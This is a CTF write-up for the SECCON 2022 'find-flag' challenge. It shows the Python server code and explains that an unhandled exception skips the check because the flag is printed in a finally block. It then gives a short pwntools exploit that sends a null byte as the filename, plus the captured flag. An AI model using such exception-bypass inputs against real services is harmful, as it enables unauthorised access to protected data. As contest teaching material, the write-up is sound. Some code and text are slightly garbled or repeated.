---
layout: post
title: find-flag
parent: SECCON 2022
tags: [MISC]
grand_parent: CTF Write-ups
nav_order: 2
lang: en
lang-ref: SECCON 2022 - find - flag
hidden: true
---

# Find-Flag_en

```python
#server.py
#!/usr/bin/env python3.9
import os

FLAG = os.getenv("FLAG", "FAKECON{*** REDUCTED ***}").encode()
print(len(FLAG))
def check():
    try:
        filename = input("filename: ")
        if open(filename, "rb").read(len(FLAG)) == FLAG:
            return True
    except FileNotFoundError:
        print("[-] missing")
    except IsADirectoryError:
        print("[-] seems wrong")
    except PermissionError:
        print("[-] not mine")
    except OSError:
        print("[-] hurting my eyes")
    except KeyboardInterrupt:
        print("[-] gone")
    return False

if __name__ == '__main__':
    try:
        check = check()
    except:
        print("[-] something went wrong")
        exit(1)
    finally:
        if check:
            print("[+] congrats!")
            print(FLAG.decode())
```

```python
if __name__ == '__main__':
    try:
        check = check()
    except:
        print("[-] something went wrong")
        exit(1)
    finally:
        if check:
            print("[+] congrats!")
            print(FLAG.decode())
```

What is noteworthy about the above code is that the FLAG output is in the FINALLY.

In other words, In the check() function, we can make an exception and bypass the check process.

```python
except FileNotFoundError:
        print("[-] missing")
    except IsADirectoryError:
        print("[-] seems wrong")
    except PermissionError:
        print("[-] not mine")
		except OSError:
        print("[-] hurting my eyes")
```

An ERROR list exceptionally processed by the check() function.

It is possible to make a detour by making other exceptions that are not applicable.

I proceeded the detour using ValueError: embedded null byte.

```c
//local_setup.c
//gcc -o local_setup local_setup.c

#include <stdlib.h>

void main()
{
    system("/usr/bin/python3 server.py");
}
```

The above is a process in which the code is executed using the c code in order to turn it locally without running Docker.

```python
#exploit.py
#remote exploit

"""from pwn import *

payload = b'\x00'
r = remote('find-flag.seccon.games', 10042)
r.recvuntil(b"filename: ")
r.sendline(payload)
print(r.recv())"""

#local exploit

from pwn import *

p = process('./local_setup')
payload = b'\x00'

p.recvuntil(b'filename: ')
p.sendline(payload)
print(p.recv())F
```

![image](/assets/images/SECCON2022/Find-Flag/find-flag.png)

FLAG: SECCON{exit_1n_Pyth0n_d0es_n0t_c4ll_exit_sysc4ll}

An ERROR list exceptionally processed by the check() function.

It is possible to make a detour by making other exceptions that are not applicable.

I proceeded the detour using ValueError: embedded null byte.